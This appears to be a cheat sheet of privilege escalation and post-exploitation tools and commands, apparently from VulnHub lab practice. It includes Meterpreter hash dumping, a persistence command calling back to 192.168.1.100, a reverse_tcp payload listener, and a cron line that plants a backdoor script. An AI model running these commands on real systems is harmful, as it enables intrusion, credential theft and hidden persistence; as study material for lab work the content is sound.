##Tools Used
Tool	                 	 Purpose	                                        Platform
LinPEAS	    	           Linux privilege escalation enumeration         	Linux
PowerSploit		           PowerShell post-exploitation framework         	Windows
Meterpreter		           Metasploit payload for post-exploitation	        Cross-platform
Metasploit		           Exploitation framework	                          Kali Linux
VulnHub VM	             Various	Practice environments                 	Virtual Machine
Linux Exploit Suggester	 Kernel exploit identification                  	Linux


##Commands Used
Tool	            Command	                                            Purpose
LinPEAS	          ./linpeas.sh -a                                    	Full privilege escalation scan
LinPEAS	          ./linpeas.sh -s                                    	Quick enumeration
Meterpreter	      getsystem            	                              Attempt automatic privilege escalation
Meterpreter	      hashdump	                                          Dump password hashes
Meterpreter	      persistence -U -X -i 60 -p 4444 -r 192.168.1.100	  Set up persistence
Metasploit	      use exploit/multi/handler	                          Start listener
Metasploit	      set payload linux/x64/meterpreter/reverse_tcp	      Set payload
Linux	find         / -perm -4000 2>/dev/null	                        Find SUID files
Linux	crontab     -l	                                                List cron jobs 
Linux	echo        "* * * * * /tmp/backdoor.sh" > /tmp/cronjob	        Create malicious cron
